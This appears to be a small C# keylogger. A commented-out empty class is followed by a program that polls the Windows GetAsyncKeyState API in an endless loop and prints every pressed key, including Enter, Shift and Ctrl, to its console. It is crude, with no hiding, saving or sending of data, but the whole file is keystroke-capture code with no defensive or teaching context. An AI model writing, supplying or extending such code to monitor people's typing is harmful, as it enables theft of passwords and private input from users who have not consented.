/*using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Mylibrary
{
    public class Class1
    {
    }
}
*/
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Key
{
    public static class Log
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public static void Main()
        {
            while (true)
            {
                Thread.Sleep(150);
                for (int i = 8; i < 127; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key != 0)
                    {
                        Console.WriteLine((char)i);
                        switch (i)
                        {
                            case 8: Console.WriteLine("{backspace}"); break;
                            case 9: Console.WriteLine("{TAB}"); break;
                            case 27: Console.WriteLine("{escape}"); break;
                            case 32: Console.WriteLine("{Space}"); break;
                            case 46: Console.WriteLine("{delete}"); break;
                            case 20: Console.WriteLine("{caps lock}"); break;
                            case 17: Console.WriteLine("{ctrl}"); break;
                            case 18: Console.WriteLine("{alt}"); break;
                            case 13: Console.WriteLine("{enter}"); break;
                            case 16: Console.WriteLine("{shift}"); break;
                        }
                    }

                }
            }
        }
    }
}